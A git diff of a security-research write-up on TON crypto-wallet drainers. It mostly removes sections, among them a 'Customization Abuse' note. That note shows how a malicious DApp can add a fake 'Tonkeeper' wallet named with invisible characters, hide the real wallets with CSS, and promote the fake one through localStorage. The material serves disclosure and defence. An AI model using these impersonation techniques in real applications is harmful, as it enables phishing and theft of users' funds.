@@ -112,47 +112,7 @@ Here is an example of what the **TON Connect** manifest, the `tonconnect-manifes
 >[!NOTE]
 > **N.B**: none of the values, including the DApp's `name`, are required to be unique. Anyone might as well call their DApp "TON", "TON Vote", "TON Spin" or "TON Airdrop", set any link and any icon of their choice;
 
-
-Moreover, **TON Connect** constructor has a semi-optional `manifestUrl` parameter. If it remains empty, **TON Connect** assumes that `tonconnect-manifest.json` is located at the very root of the application:
-```ts title="ton-connect/sdk/packages/sdk/src/ton-connect.ts"
-export class TonConnect implements ITonConnect {
-	...
-    constructor(options?: TonConnectOptions) {
-        this.dappSettings = {
-            manifestUrl: options?.manifestUrl || getWebPageManifest(),
-            storage: options?.storage || new DefaultStorage()
-        };
-        ...
-    }
-	...
-}
-```
-
-```ts title="ton-connect/sdk/packages/sdk/src/utils/web-api.ts"
-export function getWebPageManifest(): string {
-    const origin = getWindow()?.location.origin;
-    if (origin) {
-        return origin + '/tonconnect-manifest.json';
-    }
-	
-    return '';
-}
-```
-
->[!IMPORTANT]
-> This is precisely the reason why this feature is considered necessary – **TON Connect** should be able to find the manifest file in case `window.location.origin` is undefined. On the other hand, due to the lack of checks, it is possible to pass any valid URL to the `manifestUrl`, as long as it points at a file that contains a JSON object with the required keys (`name`, `url`, `icon`) – even if it belongs to some other application somewhere on the Web.
-
-
-Summing up, since **TON Connect** manifest is controlled by the DApp and the values stated there are passed to Wallets as is, it is possible for the malicious DApp to impersonate a legitimate one by filling its manifest with data that looks legitimate. As for today, the problem of data verification is an open issue, the effective solution to it that would fit into any Wallet implementation is yet to be found. However, there are solutions that work and do so quite well:
-
-- There are **domain verification mechanisms** that require editing DNS records or uploading a certain file to prove one's ownership over the domain (Verify API);
-- There are **AI-based tools** that analyze transactions with the help of machine learning to tag suspicious operations and potential fraudulent actions (Blockaid, Blowfish);
-- Most Wallets implement **blocklists** to warn Users about domains that has been reported as malicious;
-
-The most commonly used Wallet developed specifically to be utilized within the TON ecosystem, **Tonkeeper**, introduces the following defense mechanisms:
-
-- **2FA** via **Telegram**: in addition to the default in-wallet approval request, every transaction initiates a message from the official [@Tonkeeper](https://t.me/tonkeeper) Telegram Bot with buttons to approve or cancel the pending transaction. This feature is only available in the Pro version though;
-- **Signer** – an application to sign and approve transactions, developed specifically to store private keys separately from the **Tonkeeper** application;
+Summing up, since **TON Connect** manifest is controlled by the DApp and the values stated there are passed to Wallets as is, it is possible for the malicious DApp to impersonate a legitimate one by filling its manifest with data that looks legitimate. We discuss this problem more in [the following article](https://neplox.security/research/securing-ton-wallets) about vulnerabilities found in Wallets that support TON: [neplox.security/research/securing-ton-wallets](https://neplox.security/research/securing-ton-wallets).
 
 None of the TON wallets that our Team has looked into (**Tonkeeper**, **Telegram Wallet**, **TON Wallet**, **MyTonWallet**) sufficiently warned us, as Users, about a mismatch between the domain that initiated the Wallet connection request and the domain stated in the modal window, or tagged the transactions initiated by samples of TON Drainers as suspicious, except one – **XTON Wallet**, which mentioned the actual origin of the malicious DApp on most of the steps throughout the interaction flow.
 
@@ -291,188 +251,6 @@ Unlike previous samples, this Drainer is divided into Client-Side and Server-Sid
 - As the resulting transaction gets sent via **TON Connect** UI, the Client sends request to the `notifyTransactionStatus` method to make the Server notify the Drainer Operator on the results of the transaction.
 
 ![Level 1.1 attack scenario on user's click](./level-1-1-click.png)
-
-### Note: UI Customization
-
-Lets step aside and take a moment to discuss a significant topic that must inevitably pop up, since we talk about TON Drainers and the ways they exploit possibilities provided to the legitimate developers.
-
-#### Baseline
-
-> Useful resources:
-> - [**TON Connect UI**: UI Customisation](https://github.com/ton-connect/sdk/tree/main/packages/ui#ui-customisation)
-> - [**TON Connect UI**: Direct CSS customisation](https://github.com/ton-connect/sdk/tree/main/packages/ui#direct-css-customisation)
-> - [**TON Connect UI**: Extend Wallets list](https://github.com/ton-connect/sdk/tree/main/packages/ui#extend-wallets-list)
-
-**TON Connect** introduces customization options: the developers are welcome to make changes to its interface so that it keeps consistent with their application design.
-
-First of all, developers can set any element of the application to be the one that hosts the "Connect Wallet" button, the root is set in the `TonConnectUI` object as a `buttonRootId` parameter:
-```js title="index.js"
-const tonConnectUI = new TonConnectUI({
-	manifestUrl: '<URL>',
-	buttonRootId: '<ID>'
-});
-```
-
-They also can edit any CSS class of their choice used to style the "Connect Wallet" button or the corresponding modal window. Here are tables describing all of the classes provided by **TON Connect** according to its documentation in the ["Direct css customisation"](https://github.com/ton-connect/sdk/tree/main/packages/ui#direct-css-customisation) section:
-
-- UI components:
-
-| Element                              | Selector                                            | Element description                                                                                                   |
-|--------------------------------------|-----------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|
-| Connect wallet modal container       | `[data-tc-wallets-modal-container="true"]`          | Container of the modal window that opens when you click on the "connect wallet" button.                               |
-| Mobile universal modal page content  | `[data-tc-wallets-modal-universal-mobile="true"]`   | Content of the general mobile modal page with horizontal list.                                                        |
-| Desktop universal modal page content | `[data-tc-wallets-modal-universal-desktop="true"]`  | Content of the universal desktop modal page with QR.                                                                  |
-| Mobile selected wallet's modal page  | `[data-tc-wallets-modal-connection-mobile="true"]`  | Content of the selected wallet's modal page on mobile.                                                                |
-| Desktop selected wallet's modal page | `[data-tc-wallets-modal-connection-desktop="true"]` | Content of the selected wallet's modal page on desktop.                                                               |
-| Wallets list modal page              | `[data-tc-wallets-modal-list="true"]`               | Content of the modal page with all available wallets list (desktop and mobile).                                       |
-| Info modal page                      | `[data-tc-wallets-modal-info="true"]`               | Content of the modal page with "What is a wallet information".                                                        |
-| Action modal container               | `[data-tc-actions-modal-container="true"]`          | Container of the modal window that opens when you call `sendTransaction` or other action.                             |
-| Confirm transaction modal content    | `[data-tc-confirm-modal="true"]`                    | Content of the modal window asking for confirmation of the action in the wallet.                                      |
-| "Transaction sent" modal content     | `[data-tc-transaction-sent-modal="true"]`           | Content of the modal window informing that the transaction was successfully sent.                                     |
-| "Transaction canceled" modal content | `[data-tc-transaction-canceled-modal="true"]`       | Content of the modal window informing that the transaction was not sent.                                              |
-| Confirm sign data modal              | `[data-tc-sign-data-confirm-modal="true"]`          | Content of the modal window asking for confirmation of the signing data in the wallet.                                |
-| "Sign data canceled" moda l          | `[data-tc-notification-sign-data-cancelled="true"]` | Content of the modal window informing that the signing data was not confirmed.                                        |
-| "Sign data error" modal              | `[data-tc-notification-sign-data-error="true"]`     | Content of the modal window informing that the signing data was not confirmed due to an error.                        |
-| "Connect Wallet" button              | `[data-tc-connect-button="true"]`                   | "Connect Wallet" button element.                                                                                      |
-| Wallet menu loading button           | `[data-tc-connect-button-loading="true"]`           | Button element which appears instead of "Connect Wallet" and dropdown menu buttons while restoring connection process |
-| Wallet menu dropdown button          | `[data-tc-dropdown-button="true"]`                  | Wallet menu button -- host of the dropdown wallet menu (copy address/disconnect).                                     |
-| Wallet menu dropdown container       | `[data-tc-dropdown-container="true"]`               | Container of the dropdown that opens when you click on the "wallet menu" button with ton address.                     |
-| Wallet menu dropdown content         | `[data-tc-dropdown="true"]`                         | Content of the dropdown that opens when you click on the "wallet menu" button with ton address.                       |
-| Notifications container              | `[data-tc-list-notifications="true"]`               | Container of the actions notifications.                                                                               |
-| Notification confirm                 | `[data-tc-notification-confirm="true"]`             | Confirmation notification element.                                                                                    |
-| Notification tx sent                 | `[data-tc-notification-tx-sent="true"]`             | Transaction sent notification element.                                                                                |
-| Notification cancelled tx            | `[data-tc-notification-tx-cancelled="true"]`        | Cancelled transaction notification element.                                                                           |
-
-- Basic UI elements:
-
-| Element      | Selector                        |
-| ------------ | ------------------------------- |
-| Button       | `[data-tc-button="true"]`       |
-| Icon-button  | `[data-tc-icon-button="true"]`  |
-| Modal window | `[data-tc-modal="true"]`        |
-| Notification | `[data-tc-notification="true"]` |
-| Tab bar      | `[data-tc-tab-bar="true"]`      |
-| H1           | `[data-tc-h1="true"]`           |
-| H2           | `[data-tc-h2="true"]`           |
-| H3           | `[data-tc-h3="true"]`           |
-| Text         | `[data-tc-text="true"]`         |
-| Wallet-item  | `[data-tc-wallet-item="true"]`  |
-
-Plus, **TON Connect** lets you make changes to the list of displayed Wallets: filter out those Wallets that do not support certain features necessary for your DApp (`walletsRequiredFeatures`), such as multiple messages per transaction or extra currencies, or, on the contrary, prioritize Wallets that do support them (`walletsPreferredFeatures`), and even add extra Wallets (`walletsListConfiguration`).
-
-Additional Wallets are expected to be defined within the `walletsListConfiguration[includeWallets]` parameter of the `TonConnectUI` object, like that:
-```js title="index.js"
-const tonConnectUI = new TonConnectUI({
-	manifestUrl: '<URL>',
-	buttonRootId: '<ID>',
-	walletsListConfiguration: {
-		includeWallets: [
-			{
-				name: "<NAME>",
-				appName: "<NAME>",
-				jsBridgeKey: "<KEY>",
-				aboutUrl: "<URL>",
-				universalLink: "<URL>",
-				bridgeUrl: "<URL>",
-				imageUrl: "<URL>",
-				platforms: ["android", "ios", "linux", "windows", "macos"],
-			}
-		]
-	}
-})
-```
-
-To filter out some of the Wallets included by default, you must pass the `walletsRequiredFeatures` parameter to the `TonConnectUI` object, like that:
-```js title="index.js"
-const tonConnectUI = new TonConnectUI({
-	manifestUrl: '<URL>',
-	buttonRootId: '<ID>',
-    walletsRequiredFeatures: {
-        sendTransaction: {
-			minMessages: 4,
-			extraCurrencyRequired: true
-		}
-	}
-})
-```
-
-This configuration does not remove the Wallets that do not suit your needs from the Wallets list, but makes them appear semi-transparent, with a message stating "`The wallets below don’t support all features of the connected service.`" right above them:
-
-![Note on TON Connect modal UI customization: developers may filter out wallets based on the service's needs](./note-ui-customization-filter.png)
-
-#### Customization Abuse
-
-Even though the ability to add custom Wallets through the `walletsListConfiguration` parameter is a legitimate feature necessary for the sake of a seamless integration of various Wallets, including [Bitget](https://web3.bitget.com/en/docs/adaptors/tonconnect.html) and [UXUY](https://docs.uxuy.com/uxuy-connect/tonconnect/), who mention it in their documentation, one may use it with malicious intention.
-
-> [!IMPORTANT]
-> The first thing that comes to mind of a Security Researcher is the possibility of a Wallet Impersonation. Obviously, since **TON Connect** is integrated into the Client-Side of an application, one is free to rewrite it in whatever way they want by design, but that would require additional efforts, whereas in-built UI customization features of **TON Connect** make it much easier to handle.
-
-Imagine one would like to add a malicious custom Wallet to the Wallets list displayed by **TON Connect**. Since Users are highly likely to click the Wallet they are used to, such as **Tonkeeper**, the malicious actor might be inclined to call their malicious Wallet "Tonkeeper" as well. Doing so, however, results in the malicious Wallet not being added to the list: the `walletsList` composition process implies each Wallet must be unique.
-
-```ts title="ton-connect/sdk/packages/ui/src/app/utils/wallets.ts"
-...
-export function applyWalletsListConfiguration(
-    walletsList: WalletInfo[],
-    configuration?: WalletsListConfiguration
-): WalletInfo[] {
-    if (!configuration) {
-        return walletsList;
-    }
-	
-    if (configuration.includeWallets?.length) {
-        walletsList = mergeConcat(
-            'name',
-            walletsList,
-            configuration.includeWallets.map(uiWalletToWalletInfo)
-        );
-    }
-	
-    return walletsList;
-}
-...
-```
-
-Not that it stops from impersonation. All it takes to is to append any kind of invisible characters to the name of the Wallet so that its name is considered unique among other Wallets, but does not visibly differ from the target Wallet:
-
-```js title="index.js"
-const tonConnectUI = new TonConnectUI({
-	manifestUrl: '<URL>',
-	buttonRootId: '<ID>',
-	walletsListConfiguration: {
-		includeWallets: [
-			{
-				name: " Tonkeeper ",
-				appName: "neploxTonWallet",
-				jsBridgeKey: "neploxTonWallet",
-				aboutUrl: "https://neplox.security",
-				universalLink: "https://t.me/neploxaudit?attach=wallet",
-				bridgeUrl: "https://neplox.security/bridge",
-				imageUrl: "https://neplox.security/icons/neplox.svg",
-				platforms: ["android", "ios", "linux", "windows", "macos"],
-			}
-		]
-	}
-})
-```
-
-This configuration lets developers easily add yet another "Tonkeeper" to the Wallets list of **TON Connect**. However, it lands at the end of the list and Users are still able to see the original **Tonkeeper** application at the very top:
-
-![Note on TON Connect modal UI customization: developers may add custom wallets with custom metadata](./note-ui-customization-extra-wallet.png)
-
-Since the `walletsRequiredFeatures` intended to filter out Wallets from the Wallets list does not remove, but disables unwanted Wallets, and currently there is no other configuration parameter that would do the work, that is the moment where CSS classes come in handy: one can hide any Wallet from the Wallets list just by selecting it with its CSS selector of `[data-tc-wallet-item="true"]` and passing `display: none` as a style.
-
-```css title="index.css"
-li:has(button[data-tc-wallet-item="true"]):nth-of-type(-n+15) {
-	display: none;
-}
-```
-
-Now there is only one "Tonkeeper" Wallet in the Wallets list, and its not the legitimate one:
-
-![Note on TON Connect modal UI customization: developers may also alter the modal in a lot of other ways, e.g. remove legitimate wallets](./note-ui-customization-extra-wallet-css.png)
-
-As a result – a successful impersonation of legitimate Wallets that does not require developers to reinvent the wheel.
-
 
 ## Level 1.2
 
@@ -648,18 +426,6 @@ await protocol.sendLog({
 });
 ```
 
-Apart from `ton-connect-storage_bridge-connection` and `ton-connect-ui_wallet-info`, **TON Connect** also stores a couple more keypairs in the application's Local Storage: `ton-connect-storage_http-bridge-gateway`, `ton-connect-ui_wallet-info`, `ton-connect-ui_preferred-wallet`, ...
-
-Remember how `walletsListConfiguration[includeWallets]` appends all of the extra Wallets to the end of the Wallets list? Well, one can set the `ton-connect-ui_preferred-wallet` to store the name of the malicious Wallet for it to be placed at the very beginning of the list and be marked as "`Recent`":
-
-```js title="index.js"
-...
-window.localStorage.setItem('ton-connect-ui_preferred-wallet', '<app_name>');
-...
-```
-
-![Note on TON Connect configuration stored in Local Storage](./note-local-storage-extra-wallet.png)
-
 ### Sample 2: Bridge HTTP API & Origin Forgery
 
 Why store the values extracted from the Local Storage? Just in case, of course.
@@ -709,7 +475,7 @@ router.get('<ENDPOINT>', async function (req, res, next) {
 
 ### Sample 2: WebSocket API
 
-The most busy part of the Level 2 Drainer is its WebSocket API. This module consists of multiple submodules responsible for a wide set of functions:
+The busiest part of the Level 2 Drainer is its WebSocket API. This module consists of multiple submodules responsible for a wide set of functions:
 
 - "Assets Scanner" – actively interacts with TON API, collets and writes down information regarding the User's Wallet: its address, TON balance, Jettons and NFTs, latest events;
 - "Notification System" – handles the process of notifying the Drainer Operator on events via the Telegram Bot;
